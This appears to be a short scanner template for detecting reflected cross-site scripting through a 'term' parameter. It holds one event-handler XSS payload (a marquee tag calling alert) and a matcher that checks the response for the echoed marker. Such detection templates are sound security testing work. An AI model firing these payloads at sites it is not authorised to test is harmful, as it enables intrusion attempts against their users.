id: xss2-042
name: 'Reflected XSS2 ctx-11 via term'
severity: high
type: active
tags:
  - xss
  - injection
  - client
description: 'Unencoded reflection in term'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      term:
        - '<marquee loop=1 behavior=slide width=1 onstart=alert(nx2041)>'
    matchers:
      - type: word
        part: body
        words:
          - 'nx2041'
